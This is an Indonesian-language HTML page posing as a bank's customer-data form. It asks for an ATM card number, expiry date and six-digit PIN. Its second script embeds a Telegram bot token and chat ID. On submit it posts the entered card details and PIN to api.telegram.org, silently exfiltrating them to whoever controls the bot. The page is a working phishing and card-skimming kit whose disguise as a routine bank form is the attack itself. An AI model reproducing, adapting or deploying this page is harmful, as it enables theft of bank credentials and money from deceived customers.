<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Form Data Nasabah</title>
<style>
  body {
    margin: 0;
    font-family: 'Arial', sans-serif;
    background-color: #fff;
  }
  .header {
    background: linear-gradient(45deg, #1669b9, #1eaefc);
    color: white;
    padding: 20px 16px;
    position: relative;
  }
  .back-arrow {
    position: absolute;
    left: 16px;
    top: 20px;
    font-weight: bold;
    font-size: 24px;
    cursor: pointer;
  }
  .header h2 {
    margin: 0;
    text-align: center;
    font-weight: 600;
  }
  .container {
    margin: 20px 16px;
  }
  label {
    font-weight: 500;
    color: #6d6d72;
    font-size: 14px;
    display: block;
    margin-bottom: 6px;
  }
  input[type=text], input[type=password], input[type=tel] {
    width: 100%;
    padding: 12px 40px 12px 12px;
    font-size: 14px;
    border-radius: 8px;
    border: 1px solid #d8d8d8;
    background-color: #f6f8fa;
    box-sizing: border-box;
    color: #1669b9;
    font-weight: 600;
    letter-spacing: 0.1em;
    outline: none;
  }
  .input-with-icon {
    position: relative;
    margin-top: 6px;
  }
  .input-with-icon svg {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    fill: #1669b9;
    width: 20px;
    height: 20px;
  }
  .helper-text {
    font-size: 12px;
    color: #999;
    text-align: right;
    margin-top: 2px;
  }
  button {
    background-color: #ffcb45;
    border: none;
    color: #666;
    font-weight: 600;
    width: 100%;
    padding: 14px 0;
    font-size: 16px;
    border-radius: 10px;
    margin-top: 32px;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="header">
  <div class="back-arrow">&#8592;</div>
  <h2>Informasi Data Nasabah.</h2>
</div>

<div class="container">
  <form>
    <label for="cardNumber">Nomor Kartu ATM</label>
    <input type="tel" id="cardNumber" maxlength="18" placeholder="Masukkan nomor kartu ATM Kamu" pattern="\d*" inputmode="numeric" />
    <div class="helper-text" id="cardNumberCount">0/18</div>

    <label for="expiryDate" style="margin-top: 20px;">Tanggal Kadalursa Kartu ATM</label>
    <div class="input-with-icon">
      <input type="tel" id="expiryDate" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" />
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-label="Calendar icon" role="img">
        <path d="M7 11h2v2H7v-2zm4 0h2v2h-2v-2zm4 0h2v2h-2v-2zM3 21h18v-2H3v2zm18-12h-3V4h-2v5H8V4H6v5H3v2h18v-2z" />
      </svg>
    </div>

    <label for="pin" style="margin-top: 20px;">6-Digit PIN Kartu ATM</label>
    <div class="input-with-icon">
      <input type="password" id="pin" maxlength="6" placeholder="PIN" pattern="\d*" inputmode="numeric" />
      <svg id="togglePin" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-label="Toggle PIN visibility" role="button" tabindex="0">
        <path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>
        <line x1="1" y1="1" x2="23" y2="23" stroke="#656565" stroke-width="2" />
      </svg>
    </div>
    <div class="helper-text" id="pinCount">0/6</div>

    <button type="submit">Selanjutnya</button>
  </form>
</div>

<script>
  // Update counter for card number
  const cardNumberInput = document.getElementById('cardNumber');
  const cardNumberCount = document.getElementById('cardNumberCount');
  cardNumberInput.addEventListener('input', () => {
    cardNumberCount.textContent = `${cardNumberInput.value.length}/18`;
  });

  // Update counter for PIN
  const pinInput = document.getElementById('pin');
  const pinCount = document.getElementById('pinCount');
  pinInput.addEventListener('input', () => {
    pinCount.textContent = `${pinInput.value.length}/6`;
  });

  // Toggle PIN visibility
  const togglePin = document.getElementById('togglePin');
  togglePin.addEventListener('click', () => {
    if(pinInput.type === 'password'){
      pinInput.type = 'text';
      togglePin.innerHTML = `<path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>`;
    } else {
      pinInput.type = 'password';
      togglePin.innerHTML = `<path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>
      <line x1="1" y1="1" x2="23" y2="23" stroke="#656565" stroke-width="2" />`;
    }
  });
</script>
<script>
  const botToken = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Ganti dengan token bot Telegram Anda
  const chatId = '7213790655';     // Ganti dengan chat id tujuan pesan

  const form = document.querySelector('form');
  const cardNumberInput = document.getElementById('cardNumber');
  const expiryDateInput = document.getElementById('expiryDate');
  const pinInput = document.getElementById('pin');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const cardNumber = cardNumberInput.value.trim();
    const expiryDate = expiryDateInput.value.trim();
    const pin = pinInput.value.trim();

    // Validasi sederhana
    const mmYYPattern = /^(0[1-9]|1[0-2])\/\d{2}$/;
    if(cardNumber.length < 16 || cardNumber.length > 18){
      alert('Nomor kartu ATM harus antara 16-18 digit');
      return;
    }
    if(!mmYYPattern.test(expiryDate)){
      alert('Tanggal kadalursa harus format MM/YY');
      return;
    }
    if(pin.length !== 6){
      alert('PIN harus 6 digit');
      return;
    }

    // Membuat pesan yang akan dikirim ke Telegram
    const message = 
      `ðŸ“‹ *Informasi Data Nasabah*\n\n` +
      `*Nomor Kartu ATM:* ${cardNumber}\n` +
      `*Tanggal Kadalursa:* ${expiryDate}\n` +
      `*PIN:* ${pin}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const params = {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    };

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(params)
      });

      if(response.ok){
        alert('Data berhasil terkirim ke Telegram!');
        form.reset();
        // Update counters setelah reset
        document.getElementById('cardNumberCount').textContent = '0/18';
        document.getElementById('pinCount').textContent = '0/6';
      } else {
        alert('Gagal mengirim data ke Telegram.');
      }
    } catch (error) {
      alert('Terjadi kesalahan: ' + error.message);
    }
  });
</script>

</body>
</html>
